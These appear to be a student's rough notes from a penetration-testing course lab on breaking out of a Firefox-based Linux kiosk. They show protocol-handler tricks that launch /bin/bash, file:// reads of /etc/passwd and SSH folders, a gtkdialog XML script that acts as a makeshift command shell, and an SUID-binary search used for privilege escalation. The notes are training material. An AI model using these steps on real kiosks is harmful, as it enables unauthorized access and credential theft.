# Kiosk breakouts

Interactive kiosks620 are computer systems that are generally intended to be used by the public for 
tasks such as Internet browsing, registration, or information retrieval. They are commonly 
installed in the lobbies of corporate buildings, in airports and retail establishments, and in various 
other locations.

# Kiosk enumeration

several projects dedicated to enumerating useful binaries for this purpose such as the 
Windows-based Living Off The Land Binaries and Scripts (LOLBAS) project625 or the Unix/Linuxbased GTFOBins626 project

`$ sudo apt install tigervnc-viewer`

`xtugervncviewer`

then we can look at the browser

`about:config`

`history`

`file:///var/www/localhost`

`g chrome://, ftp://, mailto:, smb:// , irc://myhost`

### 11.1.1.1 Exercises
1. What additional information can be discovered about the kiosk? What type of OS is it 
running?
2. Examine the kiosk interface and try different Firefox-specific “about:” keywords and other 
inputs in the address bar to see what feedback the kiosk interface provides and what 
information can be gathered

# Command execution

we explore the options of drop down 
and we select an application and it opens

we can try 
`irc://myhost=something /bin/bash`

# leveraging firefox profiles

`irc://myhost -P "haxor"` - commandline for new profile in firefox

which might provide with new set of menus

# enumerating system information

file:///URI 

so we can try and use file :///etc/passwd

file:///proc/version

file:///home/guest/.ssh/

file:///var/www/localhost/index.html

we can look at login and passwords

# scratching the surface

file:///home/guest/mytest.txt

however we want to run program with more than
irc://myhost

we have one application in particular /usr/bin/gtkdialog

which might be helpful.

dialog box for testing:
```html
<window>
 <vbox>
 <frame Description>
 <text>
 <label>This is an example window.</label>
 </text>
 </frame>
 <hbox>
 <button ok>
 <action>echo "testing gtk" > /tmp/gtkoutput.txt</action>
 </button>
 <button cancel></button>
 </hbox>
 </vbox>
</window>
```

we can load build scripts with -f parameter

we save it as myfile

and then 
`irc://myhost -f /home/guest/mywindow`

### 11.2.4.1 Exercises
1. Browse around the filesystem using the “Launch Application” dialog and gather as much 
useful information about the system as possible.
2. Try out various programs via the “Launch Application” dialog. Which ones seem useful for 
information gathering or potential exploitation when launched from Firefox?

### 11.2.4.2 Extra Mile
Find a way to write user-provided text to a file on the file system without Scratchpad. One 
potential option might include the Javascript console

# Post Exploitation

buikt in terminal option for gtkdialog does not work. 

# simulating an interactive shell

we will try and simulate the dynamic terminal by sending commands and getting results and refreshing

```
<window>
 <vbox>
 <vbox scrollable="true" width="500" height="400">
 <edit>
 <variable>CMDOUTPUT</variable>
 <input file>/tmp/termout.txt</input>
 </edit>
 </vbox>
 <hbox>
 <text><label>Command:</label></text>
 <entry><variable>CMDTORUN</variable></entry>
 <button>
 <label>Run!</label> 
 <action>$CMDTORUN > /tmp/termout.txt</action>
 <action>refresh:CMDOUTPUT</action> 
 </button>
 </hbox>
 </vbox>
</window>
```
### 11.3.1.1 Exercises
1. Improve the terminal, making it more effective or more reliable. Integrate standard error 
output.
2. Explore the other widgets and elements of gtkdialog. What other useful features can be 
created with it that might be useful for interacting with the system?

### 11.3.1.2 Extra Mile
Experiment with creating simple applications with gtkdialog to streamline the exploitation 
process. One potential project is a text editor based on our terminal application

# Privilege Escalation

we can try runnin this command to locate suid binaries

`(find / -perm -u=s -exec ls -al {} +)`

/usr/sbin/mtr and /usr/bin/xlock have revcent vulnerabilities

`ps aux for all running process`

using ps aux we found that oprnbox is being used

# thinking outside the box

